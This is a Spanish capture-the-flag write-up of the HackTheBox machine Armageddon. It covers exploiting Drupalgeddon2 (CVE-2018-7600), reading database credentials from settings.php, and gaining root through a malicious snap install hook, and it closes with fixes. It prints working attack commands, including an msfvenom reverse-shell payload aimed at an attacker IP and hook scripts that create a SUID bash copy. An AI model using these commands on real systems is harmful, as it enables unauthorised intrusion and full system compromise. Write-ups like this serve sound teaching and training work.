Resumen

Armageddon es una máquina Easy de Linux que vive y muere por un Drupal 7 sin actualizar. El propio servidor delata el gestor a la primera, y su versión lo deja a tiro del célebre Drupalgeddon2 (CVE-2018-7600), una ejecución remota de código sin autenticar que nos mete en la máquina como apache.

Desde ese punto de apoyo —una webshell tan incómoda que no deja ni cambiar de directorio— hay que ir sacando piezas: las credenciales de la base de datos escondidas en el settings.php de Drupal, el hash del único usuario de la tabla users y, tras crackearlo con john, el acceso por SSH como brucetherealadmin.

La escalada es un snap malicioso: el usuario puede lanzar snap install como root sin contraseña, así que montamos un paquete cuyo hook de instalación nos deja una copia SUID de bash. El detalle que la hace rabiar es un /bin de solo lectura, que obliga a copiar el binario a otro sitio antes de marcarlo.

Vulnerabilidad

Dos fallos de manual, uno en la web y otro en la configuración del sistema.

01 · Drupalgeddon2 — RCE sin autenticar en Drupal 7 (CVE-2018-7600)

La versión 7.56 de Drupal es vulnerable a Drupalgeddon2: una validación deficiente de los nombres de los campos en los formularios (la Form API) permite inyectar callbacks a través de peticiones como user/register, logrando ejecución de código sin ninguna credencial. El resultado es una webshell con los privilegios del servidor web, apache.

02 · sudo sobre «snap install» — escalada por paquete malicioso

El usuario brucetherealadmin puede ejecutar /usr/bin/snap install * como root y sin contraseña. Un paquete snap instalado con --dangerous --devmode ejecuta su hook de instalación con privilegios de root, así que basta fabricar un snap cuyo hook nos deje una copia SUID de bash para convertirnos en root.

Explotación

Un Drupal 7 sin parchear enciende todas las alarmas: es el terreno del célebre Drupalgeddon2 (CVE-2018-7600), una ejecución remota de código sin autenticar. Un searchsploit confirma que hay munición de sobra para esta rama

┌──(jaime㉿kali)-[~]└─$ searchsploit drupal

El PoC de searchsploit (el 44448.py, para CVE-2018-7600) me daba guerra con las dependencias, así que tiro directamente del repositorio dreadlocked/Drupalgeddon2 de GitHub, la versión en Ruby

Al lanzarlo reclama una gem que no tenía, highline; se instala y asunto resuelto

┌──(jaime㉿kali)-[~]└─$ ruby drupalgeddon2.rb http://armageddon.htb --verbose
┌──(jaime㉿kali)-[~]└─$ sudo gem install highline

Con la dependencia en su sitio, el exploit confirma Drupal v7.56, escribe una webshell en la raíz web y nos entrega ejecución de comandos como apache

┌──(jaime㉿kali)-[~]└─$ ruby drupalgeddon2.rb http://armageddon.htb

El problema es que esta webshell es un cuchitril: no deja ni cambiar de directorio y filtra buena parte de los caracteres. Mi primer intento es lo de siempre —un msfvenom— pero al descargar el payload shell443.elf a /tmp la máquina se queja: el servicio corre con PrivateTmp=true, así que ese /tmp es privado y no sirve

┌──(jaime㉿kali)-[~]└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.15.189 LPORT=443 -f elf -o shell443.elf

Reintento apuntando a /dev/shm, que sí es escribible y compartido, y el binario llega; pero la conexión inversa nunca vuelve

Pruebo entonces una reverse de bash a pelo, y salta el filtro: el carácter > está prohibido

Lo esquivo pasando el comando por base64 y decodificándolo en destino

pero sigo sin recibir conexión, ni en el 443 ni en el 80: el tráfico de salida está capado

Toca cambiar de estrategia. En Drupal, la configuración —credenciales de la base de datos incluidas— vive en sites/default/settings.php. Lo leo desde la webshell

┌──(jaime㉿kali)-[~]└─$ cat sites/default/settings.php

Escalada de privilegios

Ya como brucetherealadmin, lo primero es mirar qué puedo hacer con sudo

┌──(jaime㉿kali)-[~]└─$ sudo -l
User brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install *

Poder instalar snaps como root es justo lo que recoge GTFOBins: un paquete snap malicioso puede traer un hook de instalación que se ejecuta con privilegios. La receta monta el paquete con fpm y lo instala con --dangerous --devmode

El primer escollo: fpm no está en la víctima

┌──(jaime㉿kali)-[~]└─$ fpm -n xxxx -s dir -t snap -a all meta

así que construyo el snap en mi Kali. La idea inicial: un hook que ponga el bit SUID sobre /bin/bash

┌──(jaime㉿kali)-[~]└─$ mkdir -p meta/hooks
┌──(jaime㉿kali)-[~]└─$ echo -e '#!/bin/sh\nchmod +s /bin/bash' > meta/hooks/install
┌──(jaime㉿kali)-[~]└─$ chmod +x meta/hooks/install
┌──(jaime㉿kali)-[~]└─$ fpm -n xxxx -s dir -t snap -a all meta

Lo paso a la víctima por SSH con scp

┌──(jaime㉿kali)-[~]└─$ scp -r miarchivo brucetherealadmin@armageddon.htb:~

Pero al instalarlo falla: /bin está montado en solo lectura, así que no se puede marcar /bin/bash

┌──(jaime㉿kali)-[~]└─$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode

La vuelta es sencilla: en lugar de tocar el binario original, el hook copia /bin/bash a un sitio escribible —el propio home— como rootbash, y es a esa copia a la que le pone el SUID

┌──(jaime㉿kali)-[~]└─$ mkdir -p meta/hooks
┌──(jaime㉿kali)-[~]└─$ echo -e '#!/bin/sh\ncp /bin/bash /home/brucetherealadmin/rootbash\nchmod +s /home/brucetherealadmin/rootbash' > meta/hooks/install
┌──(jaime㉿kali)-[~]└─$ chmod +x meta/hooks/install
┌──(jaime㉿kali)-[~]└─$ fpm -n privesc -s dir -t snap -a all meta

IMPORTANTE: cada vez que se edita el hook de instalación hay que borrar el .snap y reconstruirlo; si no, fpm reutiliza una «foto congelada» del paquete anterior y la instalación no refleja los cambios

┌──(jaime㉿kali)-[~]└─$ rm miarchivo2/privesc_1.0_all.snap
┌──(jaime㉿kali)-[~]└─$ cd miarchivo2
┌──(jaime㉿kali)-[~]└─$ fpm -n privesc -s dir -t snap -a all meta

Lo transfiero de nuevo e instalo con sudo. El hook se ejecuta como root y crea el rootbash con SUID; lo lanzo con -p para conservar privilegios y ya soy root

┌──(jaime㉿kali)-[~]└─$ sudo snap install privesc_1.0_all.snap --dangerous --devmode
┌──(jaime㉿kali)-[~]└─$ /home/brucetherealadmin/rootbash -p
┌──(jaime㉿kali)-[~]└─$ whoami
root

Solo queda leer la flag de root

Cómo se arregla

Armageddon se cae por software viejo y una configuración de sudo temeraria. Por capas:

  • Actualizar Drupal: la 7.56 arrastra Drupalgeddon2 (CVE-2018-7600). Subir a una versión parcheada —o aplicar el parche SA-CORE-2018-002— elimina la RCE de raíz.
  • No exponer la instalación de serie: el CHANGELOG.txt, el /scripts/ con listing y demás ficheros por defecto regalan la versión y el stack enteros. Conviene borrarlos o restringir su acceso tras instalar.
  • Proteger el settings.php: que la webshell pueda leer sites/default/settings.php expone las credenciales de la base de datos en claro. Permisos estrictos y, mejor, credenciales fuera del alcance del usuario del servidor web.
  • Quitar el sudo sobre snap: permitir snap install * como root sin contraseña es una escalada servida. Si de verdad hace falta, acotar a paquetes concretos y nunca con --dangerous --devmode.
  • Mínimo privilegio y contraseñas decentes: un hash de rockyou como booboo cae en segundos. Contraseñas largas y únicas, y servicios con el menor privilegio posible.

Conclusiones

Máquina muy compleja, intenta continuamente jugar con los permisos para poner problemas, realmente no la consideraría una máquina fácil por eso, luego la explotación y la escalada si no llega a ser por todas las trabas que pone, sería de nivel fácil
